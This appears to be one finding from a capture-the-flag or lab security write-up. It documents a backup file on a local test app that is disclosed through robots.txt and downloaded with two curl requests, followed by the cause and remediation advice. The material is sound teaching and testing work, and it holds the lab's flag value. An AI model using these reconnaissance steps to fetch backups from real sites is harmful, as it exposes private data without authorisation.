# Finding 6 — Sensitive Data Exposure (exposed backup file)

- **Class:** Sensitive Data Exposure / exposed backup (CWE-200, CWE-530,
  CWE-548) — OWASP A01:2021 / A05:2021 (Security Misconfiguration)
- **Endpoint:** `GET /backups/<path>` (disclosed via `/robots.txt`)
- **Severity:** High — a database backup is downloadable by anyone.
- **Flag:** `FLAG{exposure_294b6fe0e0bb}`

## Request (reproducible)
```bash
curl -s http://127.0.0.1:5000/robots.txt            # recon: discloses /backups/
curl -s http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

## Result (actual)
- `/robots.txt` ->
  ```
  User-agent: *
  Disallow: /backups/
  ```
- `/backups/vulnhub.sql.bak` -> `200 OK`:
  ```
  -- database backup (should NOT be world-readable)
  -- left in /backups/ by mistake
  INSERT INTO secrets VALUES ('FLAG{exposure_294b6fe0e0bb}');
  ```

## Why it works
A sensitive backup directory is served directly (app.py:338-347) with no
authentication. `robots.txt` (app.py:332-335) names the directory in a
`Disallow` rule, which does not restrict access at all — it only advertises the
path to an attacker, who requests the file directly.

## Remediation
- **Do not store backups within the web root / served paths.** Keep them off the
  server or in storage with no HTTP route.
- Require authentication + authorization for any sensitive file, and default-deny
  directory serving.
- Never rely on `robots.txt` for access control; it is a crawler hint, not a
  security boundary, and leaks the very paths you want hidden.
- Apply least-privilege file permissions and remove stray `.bak`/dump files.
